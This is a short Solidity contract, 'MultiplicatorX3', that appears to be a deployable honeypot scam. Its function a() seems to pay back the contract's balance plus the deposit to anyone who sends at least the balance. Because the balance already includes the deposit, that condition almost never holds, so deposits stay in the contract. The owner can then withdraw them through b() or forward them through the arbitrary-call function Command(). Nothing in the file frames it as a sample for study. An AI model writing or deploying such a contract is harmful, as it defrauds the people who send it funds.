// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public Owner = msg.sender;

    function() public payable{}

    function b()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address c,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        c.call.value(msg.value)(data);
    }

    function a(address c)
    public
    payable
    {
        if(msg.value>=this.balance)
        {
            c.transfer(this.balance+msg.value);
        }
    }
}